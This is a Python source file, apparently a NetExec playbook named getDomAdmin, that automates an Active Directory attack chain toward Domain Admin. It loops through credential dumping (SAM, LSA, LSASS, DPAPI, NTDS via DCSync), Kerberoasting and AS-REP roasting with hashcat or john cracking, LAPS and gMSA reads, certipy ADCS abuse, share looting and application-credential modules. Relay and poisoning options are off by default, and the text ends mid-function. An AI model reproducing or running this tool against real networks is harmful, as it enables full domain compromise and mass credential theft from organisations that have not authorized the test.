r"""getDomAdmin — a fixpoint credential-harvesting attack-graph playbook.

Goal: starting from whatever you give it (nothing, or one credential), collect as
many credentials as possible and walk the Active Directory attack graph toward
Domain Admin — then keep going until no new secret, host, or edge can be found.

How it thinks
-------------
The engine models the engagement as a graph whose NODES are (credential, host)
reach-states and whose EDGES are techniques that turn one state into new secrets,
new hosts, or new privileges (local-admin password reuse, LAPS/gMSA reads,
roasting + cracking, delegation, ADCS, DPAPI, SAM/LSA/LSASS, NTDS/DCSync, ...).

It runs a worklist / spanning-tree traversal: every (credential, target, technique)
triple is attempted at most once, so the graph is explored without looping — but
the moment a technique yields a NEW credential (or host, or privilege), fresh
triples are enqueued and the loop "goes in on itself", re-trying the whole decision
tree with the new knowledge. The loop reaches a fixpoint (saturation) when a full
pass discovers nothing new, or when a safety budget is hit.

Credential discovery is read back from NetExec's own workspace database after every
step (NetExec already aggregates SAM/LSA/NTDS/gMSA/DPAPI/etc. into it), so the feed
is uniform and de-duplicated; logged secrets (roast hashes, GPP/LAPS/app-loot) are
additionally harvested from step output and — where a cracker is available — cracked
back into plaintext that feeds the loop again.

Everything is logged, verbosely, especially errors (full tracebacks), to a per-run
log file and a JSONL event stream under NXC_PATH/logs, plus a final attack-path
report describing exactly how each credential (and Domain Admin) was obtained.

Usage (NetExec standard: protocol/playbook, then host, then the playbook path)
-----------------------------------------------------------------------------
    # unauthenticated start, let it discover + pivot across an authorized scope
    nxc playbook <seed_or_DC> examples/playbooks/getDomAdmin.py \
        -d DOMAIN --dns-server <DC_IP> --allow-target 10.0.0.0/24

    # start from one credential (password / NT hash / Kerberos)
    nxc playbook <DC_IP> examples/playbooks/getDomAdmin.py -u USER -p PASS \
        -d DOMAIN --dns-server <DC_IP> --allow-target 10.0.0.0/24
    nxc playbook <DC_IP> examples/playbooks/getDomAdmin.py -u USER -H NTHASH -d DOMAIN ...
    nxc playbook <DC_IP> examples/playbooks/getDomAdmin.py -u USER -p PASS -k --dns-server <DC_IP> ...

Only hosts listed with ``--allow-target`` are ever touched for pivoting; discovered
hosts outside that scope are reported but not attacked.

Toggles (environment variables)
-------------------------------
    GETDA_WORDLIST=/path/to/wordlist   crack roast/NTLM hashes (default: rockyou if present)
    GETDA_STOP_ON_DA=1                 stop as soon as Domain Admin is proven (default: keep looting)
    GETDA_ENABLE_ADCS=0               disable certipy ADCS enumeration/abuse (default: on if installed)
    GETDA_ENABLE_LOOT=0               disable the on-host application-credential loot modules (default: on when admin)
    GETDA_ENABLE_RELAY=1             enable the ntlmrelayx + coercion relay campaign (default: OFF — needs a listener/interface and is disruptive)
    GETDA_ENABLE_POISON=1            enable the Responder/mitm6 poisoning campaign (default: OFF — disruptive, stateful)
    GETDA_MAX_STEPS=4000              hard cap on total technique executions (safety backstop)
    GETDA_MAX_ROUNDS=40               hard cap on fixpoint rounds
    GETDA_PROBE_TIMEOUT=25            per-step wall-clock cap (s) for hang-prone probes
    GETDA_TOOL_TIMEOUT=600            per external-tool invocation timeout (s)

External tool dependency list
-----------------------------
All are OPTIONAL; each is probed at start and the run degrades gracefully (and logs)
when one is missing. The in-code ``DEPENDENCIES`` manifest below is the source of
truth and is printed in the preflight report.

    certipy (certipy-ad) pip install certipy-ad      ADCS enumeration + ESC abuse -> cert -> NT hash
    impacket             pip install impacket         secretsdump / GetUserSPNs / GetNPUsers / getTGT / ntlmrelayx fallbacks + relay
    bloodhound-python    pip install bloodhound       offline graph collection (alt to NetExec --bloodhound)
    hashcat              apt install hashcat           crack roast/AS-REP/NTLM -> plaintext (feeds the loop)
    john                 apt install john              cracker fallback
    Responder            apt install responder         LLMNR/NBT-NS/mDNS poisoning (campaign; optional)
    mitm6                pip install mitm6             IPv6 DNS takeover for relay (campaign; optional)
    Coercer              pip install coercer           authentication coercion (alt to NetExec coerce_plus)

Nothing here is destructive-by-default: NTDS/SAM/LSA dumps and ADCS cert requests
are read/collection of secrets (authorized pentest behaviour); relays and poisoning
are OFF by default because they need an attacker listener and disturb the network —
flip the toggles above to arm them.
"""

import os
import re
import shutil
import subprocess
import threading
import traceback
from dataclasses import dataclass, field
from datetime import datetime

from nxc.config import nxc_workspace
from nxc.paths import NXC_PATH, WORKSPACE_DIR

# --------------------------------------------------------------------------- #
# configuration / safety budgets (overridable via environment)
# --------------------------------------------------------------------------- #
def _env_int(name, default):
    try:
        return int(os.environ.get(name, "").strip() or default)
    except ValueError:
        return default


def _env_on(name, default):
    raw = os.environ.get(name, "").strip().lower()
    if raw in ("1", "true", "yes", "on"):
        return True
    if raw in ("0", "false", "no", "off"):
        return False
    return default


MAX_STEPS = _env_int("GETDA_MAX_STEPS", 4000)
MAX_ROUNDS = _env_int("GETDA_MAX_ROUNDS", 40)
PROBE_TIMEOUT = _env_int("GETDA_PROBE_TIMEOUT", 25)
TOOL_TIMEOUT = _env_int("GETDA_TOOL_TIMEOUT", 600)
STOP_ON_DA = _env_on("GETDA_STOP_ON_DA", False)
ENABLE_ADCS = _env_on("GETDA_ENABLE_ADCS", True)
ENABLE_LOOT = _env_on("GETDA_ENABLE_LOOT", True)
ENABLE_RELAY = _env_on("GETDA_ENABLE_RELAY", False)
ENABLE_POISON = _env_on("GETDA_ENABLE_POISON", False)
SPIDER_MAX = 64 * 1024 * 1024 * 1024  # effectively-unlimited share download cap

# On-host application-credential loot modules, highest value first. Each is run
# (guarded) once we hold local admin on a host; results land in NetExec's DB or
# are harvested from step output.
LOOT_MODULES = (
    "lsassy", "gpp_password", "gpp_autologin", "reg-winlogon", "wdigest",
    "winscp", "putty", "mremoteng", "rdcman", "mobaxterm", "vnc", "wifi",
    "rclone", "veeam", "keepass_discover", "powershell_history", "iis",
    "msol", "wam", "teams_localdb", "security-questions", "eventlog_creds",
)

# External tool dependency manifest (source of truth for the preflight report).
DEPENDENCIES = {
    "certipy": {"pkg": "certipy-ad (pip)", "use": "ADCS enumeration + ESC abuse -> cert -> NT hash", "bins": ("certipy", "certipy-ad")},
    "impacket-secretsdump": {"pkg": "impacket (pip)", "use": "SAM/LSA/NTDS dump fallback", "bins": ("secretsdump.py", "impacket-secretsdump")},
    "impacket-getuserspns": {"pkg": "impacket (pip)", "use": "Kerberoast fallback", "bins": ("GetUserSPNs.py", "impacket-GetUserSPNs")},
    "impacket-getnpusers": {"pkg": "impacket (pip)", "use": "AS-REP roast fallback", "bins": ("GetNPUsers.py", "impacket-GetNPUsers")},
    "impacket-gettgt": {"pkg": "impacket (pip)", "use": "request TGT from recovered key", "bins": ("getTGT.py", "impacket-getTGT")},
    "ntlmrelayx": {"pkg": "impacket (pip)", "use": "NTLM relay campaign", "bins": ("ntlmrelayx.py", "impacket-ntlmrelayx")},
    "bloodhound-python": {"pkg": "bloodhound (pip)", "use": "offline graph collection", "bins": ("bloodhound-python",)},
    "hashcat": {"pkg": "hashcat (apt)", "use": "crack roast/AS-REP/NTLM -> plaintext", "bins": ("hashcat",)},
    "john": {"pkg": "john (apt)", "use": "cracker fallback", "bins": ("john",)},
    "responder": {"pkg": "responder (apt)", "use": "LLMNR/NBT-NS/mDNS poisoning", "bins": ("responder", "Responder.py")},
    "mitm6": {"pkg": "mitm6 (pip)", "use": "IPv6 DNS takeover for relay", "bins": ("mitm6",)},
    "coercer": {"pkg": "coercer (pip)", "use": "authentication coercion", "bins": ("coercer", "Coercer")},
}


# --------------------------------------------------------------------------- #
# logging — verbose, per-run, to stdout + a log file + a JSONL event stream
# --------------------------------------------------------------------------- #
class Log:
    """Dead-simple, dependency-free, thread-safe structured logger.

    Writes human lines to stdout and a .log file, and one JSON object per event to
    a .jsonl file, so the whole run can be replayed/parsed afterwards.
    """

    LEVELS = {"DEBUG": 10, "INFO": 20, "STEP": 25, "GOOD": 30, "WARN": 35, "ERROR": 40, "CRIT": 50}

    def __init__(self, target):
        self._lock = threading.Lock()
        stamp = datetime.now().strftime("%Y-%m-%d_%H%M%S")
        safe = re.sub(r"[^A-Za-z0-9._-]", "_", str(target))
        logdir = os.path.join(NXC_PATH, "logs")
        try:
            os.makedirs(logdir, exist_ok=True)
        except OSError:
            logdir = NXC_PATH
        self.base = os.path.join(logdir, f"getDomAdmin_{safe}_{stamp}")
        self._log = self._open(self.base + ".log")
        self._jsonl = self._open(self.base + ".jsonl")

    @staticmethod
    def _open(path):
        try:
            return open(path, "a", encoding="utf-8")
        except OSError:
            return None

    def _emit(self, level, msg, **fields):
        line = f"{datetime.now().strftime('%H:%M:%S')} [{level:<5}] {msg}"
        with self._lock:
            print(f"  [getDA] {line}", flush=True)
            for handle in (self._log,):
                if handle:
                    try:
                        handle.write(line + "\n")
                        handle.flush()
                    except OSError:
                        pass
            if self._jsonl:
                try:
                    payload = {"ts": datetime.now().isoformat(), "level": level, "msg": msg, **fields}
                    self._jsonl.write(_json_min(payload) + "\n")
                    self._jsonl.flush()
                except OSError:
                    pass

    def debug(self, msg, **f): self._emit("DEBUG", msg, **f)
    def info(self, msg, **f): self._emit("INFO", msg, **f)
    def step(self, msg, **f): self._emit("STEP", msg, **f)
    def good(self, msg, **f): self._emit("GOOD", msg, **f)
    def warn(self, msg, **f): self._emit("WARN", msg, **f)
    def error(self, msg, **f): self._emit("ERROR", msg, **f)
    def crit(self, msg, **f): self._emit("CRIT", msg, **f)

    def exception(self, context, exc):
        """Log an exception with its full traceback — errors must never be silent."""
        tb = "".join(traceback.format_exception(type(exc), exc, exc.__traceback__))
        self._emit("ERROR", f"{context}: {type(exc).__name__}: {exc}")
        with self._lock:
            if self._log:
                try:
                    self._log.write(tb + "\n")
                    self._log.flush()
                except OSError:
                    pass

    def close(self):
        for handle in (self._log, self._jsonl):
            if handle:
                try:
                    handle.close()
                except OSError:
                    pass


def _json_min(obj):
    """Tiny JSON encoder (stdlib json is fine, but keep values string-safe)."""
    import json
    try:
        return json.dumps(obj, default=str)
    except (TypeError, ValueError):
        return json.dumps({k: str(v) for k, v in obj.items()}, default=str)


# --------------------------------------------------------------------------- #
# data model: credentials, the knowledge base, and the worklist
# --------------------------------------------------------------------------- #
@dataclass(frozen=True)
class Cred:
    """One credential. ``secret`` is a password, an ``lm:nt`` (or ``:nt``) hash,
    or an AES key; ``kind`` is 'plaintext' | 'hash' | 'aes'."""

    domain: str
    username: str
    secret: str
    kind: str = "plaintext"
    local: bool = False  # a local (SAM) account -> try with --local-auth and spray reuse
    source: str = "seed"  # how it was obtained (for the attack-path report)

    def key(self):
        return (self.domain.lower(), self.username.lower(), self.secret.lower(), self.kind, self.local)

    def label(self):
        shown = self.secret if self.kind == "plaintext" else f"{self.kind}:{self.secret[:12]}…"
        scope = "local" if self.local else (self.domain or "?")
        return f"{scope}\\{self.username} ({shown})"

    def login_kwargs(self, default_domain):
        """NetExec connect() kwargs for authenticating as this credential."""
        opts = {"username": [self.username]}
        dom = self.domain or default_domain or ""
        if self.local:
            opts["local_auth"] = True
            if dom:
                opts["domain"] = dom
        elif dom:
            opts["domain"] = dom
        if self.kind == "plaintext":
            opts["password"] = [self.secret]
        elif self.kind == "hash":
            opts["hash"] = [self.secret]
        elif self.kind == "aes":
            opts["aesKey"] = [self.secret] if isinstance(self.secret, str) else self.secret
            opts["kerberos"] = True
        return opts


@dataclass
class KB:
    """Shared knowledge base for one run (not module-global: one per run())."""

    log: "Log"
    default_domain: str = ""
    dns_server: str = ""
    creds: dict = field(default_factory=dict)          # key -> Cred
    hosts: dict = field(default_factory=dict)           # ip/name -> facts dict
    allowed: set = field(default_factory=set)           # targets we may touch
    admin_edges: set = field(default_factory=set)       # (cred_key, target)
    sessions: set = field(default_factory=set)          # (user, host) observed logons
    done: set = field(default_factory=set)              # (scope, technique) spanning-tree visited set
    worklist: list = field(default_factory=list)        # pending (cred, target) states
    queued: set = field(default_factory=set)            # (cred_key, target) already enqueued
    findings: list = field(default_factory=list)        # human notes / edges for the report
    roast_files: set = field(default_factory=set)       # files of $krb5* hashes to crack
    tools: dict = field(default_factory=dict)           # resolved external tool paths
    steps: int = 0
    da_reached: bool = False
    da_proof: str = ""

    # --- credential intake ------------------------------------------------- #
    def add_cred(self, cred):
        if not cred.username or cred.secret in (None, ""):
            return False
        k = cred.key()
        if k in self.creds:
            return False
        self.creds[k] = cred
        self.log.good(f"NEW CREDENTIAL: {cred.label()}  [via {cred.source}]", cred=cred.label(), source=cred.source)
        self.findings.append(f"cred {cred.label()} via {cred.source}")
        # a brand-new credential re-opens the whole graph: enqueue it everywhere.
        for target in sorted(self.allowed):
            self.enqueue(cred, target)
        self._check_da(cred)
        return True

    def add_host(self, ident, **facts):
        if not ident:
            return
        row = self.hosts.setdefault(ident, {})
        row.update({k: v for k, v in facts.items() if v is not None})

    def enqueue(self, cred, target):
        pair = (cred.key(), target)
        if pair in self.queued:
            return
        self.queued.add(pair)
        self.worklist.append((cred, target))

    def visit(self, scope, technique):
        """Spanning-tree gate: return True the first time (scope, technique) is seen."""
        tag = (scope, technique)
        if tag in self.done:
            return False
        self.done.add(tag)
        return True

    def _check_da(self, cred):
        if cred.username.lower() in ("krbtgt",) and cred.kind == "hash":
            self.da_reached = True
            self.da_proof = self.da_proof or f"recovered krbtgt hash ({cred.domain}) — full domain compromise"
            self.log.crit("DOMAIN ADMIN / DOMAIN COMPROMISE: krbtgt hash recovered (golden-ticket capable)")


@dataclass
class DAReport:
    """JSON-serializable summary stored on the final host.finding()."""

    target: str
    da_reached: bool
    da_proof: str
    credentials: list = field(default_factory=list)
    hosts: list = field(default_factory=list)
    admin_edges: list = field(default_factory=list)
    findings: list = field(default_factory=list)
    steps: int = 0
    log_file: str = ""


# --------------------------------------------------------------------------- #
# bounded execution — a hang in one probe can never freeze the whole run
# --------------------------------------------------------------------------- #
def run_bounded(fn, seconds, log, what):
    """Run fn() in a daemon thread; give up (and log) after `seconds`."""
    box = {"value": None}
    done = threading.Event()

    def worker():
        try:
            box["value"] = fn()
        except (Exception, SystemExit) as exc:  # noqa: BLE001 - must never escape
            box["value"] = exc
        finally:
            done.set()

    threading.Thread(target=worker, daemon=True).start()
    if not done.wait(seconds):
        log.warn(f"TIMEOUT after {seconds}s: {what} — abandoning this probe and moving on")
        return None, True
    value = box["value"]
    if isinstance(value, (Exception, SystemExit)):
        log.exception(f"step failed: {what}", value)
        return None, False
    return value, False


# --------------------------------------------------------------------------- #
# external tool framework
# --------------------------------------------------------------------------- #
def preflight_tools(kb):
    """Resolve every optional dependency once and log availability."""
    kb.log.step("Preflight: probing optional external tools (all optional, run degrades gracefully)")
    for name, meta in DEPENDENCIES.items():
        found = next((shutil.which(b) for b in meta["bins"] if shutil.which(b)), None)
        kb.tools[name] = found
        if found:
            kb.log.info(f"  [ok ] {name:22} -> {found}   ({meta['use']})")
        else:
            kb.log.info(f"  [--- ] {name:22} missing: {meta['pkg']}   ({meta['use']})")
    wl = os.environ.get("GETDA_WORDLIST", "").strip() or _default_wordlist()
    kb.tools["_wordlist"] = wl if wl and os.path.isfile(wl) else None
    kb.log.info(f"  wordlist: {kb.tools['_wordlist'] or 'none (cracking disabled)'}")


def _default_wordlist():
    for path in ("/usr/share/wordlists/rockyou.txt", "/usr/share/wordlists/rockyou.txt.gz",
                 os.path.expanduser("~/rockyou.txt")):
        if os.path.isfile(path):
            return path
    return ""


def run_tool(kb, argv, what, timeout=None, input_text=None):
    """Run an external tool with full logging; return (returncode, stdout, stderr)."""
    kb.log.step(f"exec tool: {what}  ::  {' '.join(str(a) for a in argv)}")
    try:
        proc = subprocess.run(  # noqa: S603 - argv list, never shell
            [str(a) for a in argv],
            capture_output=True, text=True,
            timeout=timeout or TOOL_TIMEOUT, input=input_text, check=False,
        )
    except FileNotFoundError as exc:
        kb.log.error(f"tool not found for {what}: {exc}")
        return 127, "", str(exc)
    except subprocess.TimeoutExpired as exc:
        kb.log.warn(f"tool timeout ({timeout or TOOL_TIMEOUT}s) for {what}")
        return 124, exc.stdout or "", exc.stderr or ""
    except (Exception, SystemExit) as exc:  # noqa: BLE001
        kb.log.exception(f"tool crashed for {what}", exc)
        return 1, "", str(exc)
    if proc.stdout:
        kb.log.debug(f"{what} stdout:\n{proc.stdout.rstrip()}")
    if proc.stderr:
        kb.log.debug(f"{what} stderr:\n{proc.stderr.rstrip()}")
    kb.log.info(f"{what} exited rc={proc.returncode}")
    return proc.returncode, proc.stdout or "", proc.stderr or ""


# --------------------------------------------------------------------------- #
# NetExec result / database harvesting
# --------------------------------------------------------------------------- #
def _events_text(result):
    """Flatten every log line a NetExec action/module emitted into one string."""
    out = []
    results = getattr(result, "results", None) or [result]
    for r in results:
        for ev in getattr(r, "events", None) or []:
            out.append(getattr(ev, "message", str(ev)))
        data = getattr(r, "data", None)
        for ev in getattr(data, "events", None) or []:
            out.append(getattr(ev, "message", str(ev)))
    return "\n".join(m for m in out if m)


# regexes for secrets that NetExec prints but does not always store in its DB
_RE_SECRETSDUMP = re.compile(r"^([^\s:]+):(\d+):([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::", re.M)
_RE_DOMAIN_HASH = re.compile(r"^([^\s:\\/]+(?:\\[^\s:]+)?):\d+:[0-9a-fA-F]{32}:([0-9a-fA-F]{32}):::", re.M)
_RE_KRB5TGS = re.compile(r"\$krb5tgs\$[^\s'\"]+")
_RE_KRB5ASREP = re.compile(r"\$krb5asrep\$[^\s'\"]+")
_RE_GPP = re.compile(r"(?:Username|userName)\s*[:=]\s*(?P<u>[^\s]+).*?(?:Password|cpassword|Plaintext)\s*[:=]\s*(?P<p>[^\s]+)", re.I | re.S)
_RE_LAPS = re.compile(r"(?:Computer|Host|Account)\s*[:=]\s*(?P<h>[^\s]+).*?(?:Password|ms-?mcs-?admpwd|laps)\s*[:=]\s*(?P<p>\S+)", re.I)
_RE_USERPASS = re.compile(r"(?:User|Username|login)\s*[:=]\s*(?P<u>[^\s]+)\s+(?:Password|pass|pwd)\s*[:=]\s*(?P<p>\S+)", re.I)


def harvest_events(kb, result, source, domain):
    """Secondary harvest: pull secrets out of printed output (roast hashes to files,
    plaintext/hashes to the KB). The DB sweep is primary; this catches the rest."""
    text = _events_text(result)
    if not text:
        return
    # roast / AS-REP hashes -> write to files for the cracker, and remember the SPN user
    tgs = _RE_KRB5TGS.findall(text)
    asrep = _RE_KRB5ASREP.findall(text)
    if tgs or asrep:
        path = _write_hashes(kb, source, tgs + asrep)
        if path:
            kb.roast_files.add(path)
            kb.log.good(f"captured {len(tgs)} kerberoast + {len(asrep)} AS-REP hash(es) -> {path}")
    # SAM / NTDS secretsdump-style lines
    for m in _RE_SECRETSDUMP.finditer(text):
        user, _, _lm, nt = m.group(1), m.group(2), m.group(3), m.group(4)
        local = "\\" not in user and source.startswith(("sam", "lsa"))
        dom = user.split("\\")[0] if "\\" in user else (domain if not local else "")
        uname = user.split("\\")[-1]
        kb.add_cred(Cred(dom, uname, f":{nt}", "hash", local=local, source=source))
    # GPP / LAPS / generic user:pass printed by loot modules
    for rx, note in ((_RE_GPP, "gpp"), (_RE_LAPS, "laps"), (_RE_USERPASS, "loot")):
        for m in rx.finditer(text):
            gd = m.groupdict()
            user = gd.get("u") or gd.get("h") or ""
            pw = gd.get("p") or ""
            if user and pw and not pw.startswith("$") and len(pw) < 200:
                user = user.split("\\")[-1].rstrip("$")
                kb.add_cred(Cred(domain, user, pw, "plaintext", source=f"{source}:{note}"))


def _write_hashes(kb, source, hashes):
    try:
        path = os.path.join(kb.log.base + f".{re.sub(r'[^a-z0-9]', '', source.lower())}.hashes")
        with open(path, "a", encoding="utf-8") as fh:
            for h in hashes:
                fh.write(h + "\n")
        return path
    except OSError as exc:
        kb.log.exception("could not write hash file", exc)
        return None


def _rows(db_result):
    """Normalize a SQLAlchemy result (list of Row) into list of dicts."""
    out = []
    for row in db_result or []:
        mapping = getattr(row, "_mapping", None)
        out.append(dict(mapping) if mapping is not None else {i: v for i, v in enumerate(row)})
    return out


def sync_db(kb, session, proto):
    """PRIMARY credential feed: read everything NetExec stored into its workspace DB
    and fold new credentials / hosts / admin edges / sessions into the KB."""
    db = getattr(session, "db", None)
    if db is None:
        return
    # credentials
    try:
        for r in _rows(db.get_credentials()):
            dom = (r.get("domain") or "").strip()
            user = (r.get("username") or "").strip()
            pw = r.get("password")
            ctype = (r.get("credtype") or "plaintext").strip().lower()
            if not user or pw in (None, ""):
                continue
            kind = "hash" if ctype == "hash" else "plaintext"
            local = bool(r.get("pillaged_from_hostid")) and kind == "hash"
            kb.add_cred(Cred(dom, user, str(pw), kind, local=local, source=f"{proto}-db"))
    except (Exception, SystemExit) as exc:  # noqa: BLE001
        kb.log.exception(f"reading credentials from {proto} DB", exc)
    # hosts (discovery) + DC flag
    try:
        for r in _rows(db.get_hosts()):
            ip = (r.get("ip") or "").strip()
            if ip:
                kb.add_host(ip, hostname=r.get("hostname"), os=r.get("os"), dc=r.get("dc"), domain=r.get("domain"))
    except (Exception, SystemExit) as exc:  # noqa: BLE001
        kb.log.exception(f"reading hosts from {proto} DB", exc)
    # admin + logged-on relations (pivot edges), only smb DB has them
    for getter, bucket, label in (("get_admin_relations", kb.admin_edges, "adminTo"),
                                   ("get_loggedin_relations", kb.sessions, "hasSession")):
        fn = getattr(db, getter, None)
        if not fn:
            continue
        try:
            for r in _rows(fn()):
                edge = (r.get("userid"), r.get("hostid"))
                if edge not in bucket:
                    bucket.add(edge)
                    kb.findings.append(f"{label}: user#{edge[0]} -> host#{edge[1]}")
        except (Exception, SystemExit) as exc:  # noqa: BLE001
            kb.log.exception(f"reading {getter} from {proto} DB", exc)


# --------------------------------------------------------------------------- #
# low-level NetExec helpers
# --------------------------------------------------------------------------- #
def open_session(kb, host, proto, cred):
    """Open one protocol session as a credential (or anonymously), fully logged."""
    opts = {} if cred is None else cred.login_kwargs(kb.default_domain)
    if cred is None:
        opts = {"anonymous": True}
    what = f"{proto}://{host.target} as {'anon' if cred is None else cred.label()}"

    def _connect():
        return getattr(host, proto)(**opts)

    session, _timed = run_bounded(_connect, PROBE_TIMEOUT, kb.log, f"connect {what}")
    if session is None:
        return None
    data = getattr(getattr(session, "result", None), "data", None)
    reachable = bool(getattr(session, "ok", False)) or bool(getattr(data, "connected", False))
    kb.add_host(host.target, reachable=reachable, dc=getattr(data, "is_dc", None))
    if getattr(session, "ok", False):
        kb.log.info(f"{what}: ok (auth={getattr(session, 'authenticated', False)} admin={getattr(session, 'admin', None)})")
        return session
    kb.log.debug(f"{what}: not usable (reachable={reachable})")
    return None


def do_action(kb, session, name, source, domain, **opts):
    """Call one NetExec action, bound + logged + harvested. Returns the result."""
    kb.steps += 1

    def _call():
        return getattr(session, name)(**opts)

    result, _timed = run_bounded(_call, PROBE_TIMEOUT, kb.log, f"{source}:{name}")
    if result is not None:
        harvest_events(kb, result, source, domain)
    return result


def do_module(kb, session, name, source, domain, **opts):
    """Run one NetExec module, bound + logged + harvested. Returns the ModuleResult."""
    kb.steps += 1

    def _call():
        return session.module(name, **opts)

    result, _timed = run_bounded(_call, max(PROBE_TIMEOUT, 60), kb.log, f"{source}:module:{name}")
    if result is not None:
        harvest_events(kb, result, f"{source}:{name}", domain)
    return result


# --------------------------------------------------------------------------- #
# technique groups (the decision tree's leaves)
# --------------------------------------------------------------------------- #
def smb_enumerate(kb, host, cred, session):
    source = "smb-enum"
    for name, opts in (("shares", {}), ("rid_brute", {}), ("pass_pol", {}),
                       ("disks", {}), ("loggedon_users", {}),
                       ("local_groups", {"local_groups": "Administrators"})):
        do_action(kb, session, name, source, kb.default_domain, **opts)
    # spider + download readable shares (secrets live in files)
    do_module(kb, session, "spider_plus", source, kb.default_domain, download_flag=True, max_file_size=SPIDER_MAX)


def smb_loot_admin(kb, host, cred, session):
    """Local-admin on this host: pull every on-host secret store we can."""
    source = "smb-loot"
    kb.log.step(f"LOCAL ADMIN on {host.target} as {cred.label() if cred else 'anon'} — looting host secrets")
    kb.admin_edges.add((cred.key() if cred else ("anon",), host.target))
    for name, opts in (("sam", {"sam": "secdump"}), ("lsa", {"lsa": "secdump"}), ("dpapi", {"dpapi": []})):
        do_action(kb, session, name, f"{name}", kb.default_domain, **opts)
    if ENABLE_LOOT:
        for mod in LOOT_MODULES:
            do_module(kb, session, mod, source, kb.default_domain)


def smb_dcsync(kb, host, cred, session):
    """DC + sufficient rights: dump NTDS.dit (every domain hash, incl. krbtgt)."""
    kb.log.step(f"Attempting NTDS/DCSync against DC {host.target}")
    do_action(kb, session, "ntds", "ntds", kb.default_domain, ntds="drsuapi")
    sync_db(kb, session, "smb")
    if kb.da_reached:
        kb.log.crit(f"NTDS dumped — {kb.da_proof}")


def ldap_enumerate(kb, host, cred, session):
    domain = kb.default_domain
    source = "ldap-enum"
    for name in ("users", "groups", "computers", "ous", "dc_list", "admin_count", "password_not_required"):
        do_action(kb, session, name, source, domain)
    # weird plaintext-bearing attributes (descriptions / info / userPassword / unixUserPassword)
    for mod in ("user-desc", "get-info-users", "get-userPassword", "get-unixUserPassword"):
        do_module(kb, session, mod, "ldap-fields", domain)


def ldap_roast(kb, host, cred, session):
    domain = kb.default_domain
    asrep = kb.log.base + ".asrep.hashes"
    tgs = kb.log.base + ".kerberoast.hashes"
    do_action(kb, session, "asreproast", "asreproast", domain, asreproast=asrep)
    do_action(kb, session, "kerberoasting", "kerberoast", domain, kerberoasting=tgs)
    for path in (asrep, tgs):
        if os.path.isfile(path) and os.path.getsize(path):
            kb.roast_files.add(path)


def ldap_delegation(kb, host, cred, session):
    domain = kb.default_domain
    for name in ("find_delegation", "trusted_for_delegation"):
        res = do_action(kb, session, name, "delegation", domain)
        if res is not None:
            txt = _events_text(res)
            if txt.strip():
                kb.findings.append(f"delegation ({name}): see log for abusable principals on {host.target}")


def ldap_secrets(kb, host, cred, session):
    """LAPS / gMSA / pre2k / shadow-cred candidates / ADCS enumeration."""
    domain = kb.default_domain
    do_action(kb, session, "gmsa", "gmsa", domain)
    for mod, opts in (("laps", {}), ("maq", {}), ("adcs", {}), ("sccm", {}),
                      ("pre2k", {"all": True}), ("daclread", {}), ("shadow-creds", {"action": "list"})):
        do_module(kb, session, mod, "ldap-secrets", domain, **opts)


def ldap_bloodhound(kb, host, cred, session):
    """Collect the graph (NetExec collector first, bloodhound-python as fallback)."""
    if not kb.visit(("domain", kb.default_domain), "bloodhound"):
        return
    res = do_action(kb, session, "bloodhound", "bloodhound", kb.default_domain, bloodhound=True)
    ok = res is not None and "collected" in _events_text(res).lower()
    if not ok and kb.tools.get("bloodhound-python") and cred and cred.kind == "plaintext":
        argv = [kb.tools["bloodhound-python"], "-d", kb.default_domain, "-u", cred.username,
                "-p", cred.secret, "-c", "All", "-dc", host.target]
        if kb.dns_server:
            argv += ["-ns", kb.dns_server]
        run_tool(kb, argv, "bloodhound-python collection")


def mssql_sweep(kb, host, cred, session):
    domain = kb.default_domain
    do_action(kb, session, "query", "mssql", domain,
              query="SELECT SUSER_SNAME() AS login, IS_SRVROLEMEMBER('sysadmin') AS sysadmin")
    for mod in ("enum_links", "enum_impersonate", "mssql_priv", "mssql_dumper"):
        do_module(kb, session, mod, "mssql", domain)


def adcs_campaign(kb, host, cred):
    """certipy: enumerate ADCS and (when a plaintext/hash cred is available) hunt
    vulnerable templates. Cert issuance -> PKINIT -> NT hash is logged for the
    operator to action; enumeration is always safe."""
    if not ENABLE_ADCS or not kb.tools.get("certipy") or cred is None:
        return
    if not kb.visit(("domain", kb.default_domain), "adcs-certipy"):
        return
    certipy = kb.tools["certipy"]
    user = f"{kb.default_domain}/{cred.username}" if kb.default_domain else cred.username
    argv = [certipy, "find", "-vulnerable", "-u", user, "-dc-ip", kb.dns_server or host.target, "-stdout"]
    if cred.kind == "plaintext":
        argv += ["-p", cred.secret]
    elif cred.kind == "hash":
        argv += ["-hashes", cred.secret]
    rc, out, _err = run_tool(kb, argv, "certipy find -vulnerable")
    if rc == 0 and re.search(r"ESC\d", out):
        escs = sorted(set(re.findall(r"ESC\d+", out)))
        kb.findings.append(f"ADCS vulnerable templates: {', '.join(escs)} (certipy req/auth to recover an NT hash)")
        kb.log.good(f"ADCS: vulnerable to {', '.join(escs)} — see log; cert->PKINIT->hash is a DA path")


def crack_hashes(kb):
    """Crack captured roast/AS-REP hashes -> plaintext -> feed the loop again."""
    wl = kb.tools.get("_wordlist")
    hc = kb.tools.get("hashcat")
    jn = kb.tools.get("john")
    if not kb.roast_files or not wl or not (hc or jn):
        return
    for path in sorted(kb.roast_files):
        if not kb.visit(("crackfile", path), "crack"):
            continue
        if not (os.path.isfile(path) and os.path.getsize(path)):
            continue
        with open(path, encoding="utf-8", errors="replace") as fh:
            sample = fh.read(4000)
        mode = "18200" if "$krb5asrep$" in sample else "13100" if "$krb5tgs$" in sample else None
        if hc and mode:
            pot = path + ".pot"
            run_tool(kb, [hc, "-m", mode, "-a", "0", path, wl, "--potfile-path", pot, "--quiet"],
                     f"hashcat -m {mode}", timeout=TOOL_TIMEOUT)
            rc, out, _ = run_tool(kb, [hc, "-m", mode, path, "--show", "--potfile-path", pot], "hashcat --show")
            _ingest_cracked(kb, out)
        elif jn:
            run_tool(kb, [jn, f"--wordlist={wl}", path], "john crack", timeout=TOOL_TIMEOUT)
            rc, out, _ = run_tool(kb, [jn, "--show", path], "john --show")
            _ingest_cracked(kb, out)


def _ingest_cracked(kb, text):
    """Parse 'hash:...:user...:password' cracked output into plaintext creds."""
    for line in text.splitlines():
        m = re.search(r"\$krb5(?:tgs|asrep)\$[^:]*\$?\*?([^*:$\s]+)", line)
        pw = line.rsplit(":", 1)[-1].strip() if ":" in line else ""
        if m and pw and not pw.startswith("$"):
            user = m.group(1).split("/")[0].split("\\")[-1]
            kb.add_cred(Cred(kb.default_domain, user, pw, "plaintext", source="cracked"))


def relay_campaign(kb, host):
    """Optional ntlmrelayx + coercion campaign (OFF by default). Needs an attacker
